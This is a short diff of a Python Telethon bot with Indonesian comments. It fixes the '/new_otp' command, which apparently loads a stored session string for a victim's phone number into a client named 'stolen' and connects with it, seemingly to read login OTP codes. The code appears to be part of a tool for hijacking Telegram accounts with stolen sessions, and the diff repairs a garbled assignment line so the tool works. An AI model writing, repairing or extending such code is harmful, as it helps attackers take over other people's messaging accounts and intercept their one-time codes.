@@ -113,7 +113,7 @@ Nama: {me.first_name}
 Phone: `{phone}`
     """.strip())
 
-# === /new_otp → LANGSUNG MUNCUL KODE! ===
+# === /new_otp → LANGSUNG MUNCUL KODE! (SUDAH DIPERBAIKI!) ===
 @client.on(events.NewMessage(pattern=r'/new_otp (\+\d+)'))
 async def new_otp(event):
     if event.sender_id != ADMIN_ID: return
@@ -122,7 +122,7 @@ async def new_otp(event):
         await event.reply("Session nggak ada!")
         return
     
-    session_str =Canceled sessions[phone]
+    session_str = sessions[phone]  # DI SINI SUDAH BENAR!
     stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
     await stolen.connect()
     await stolen.start()
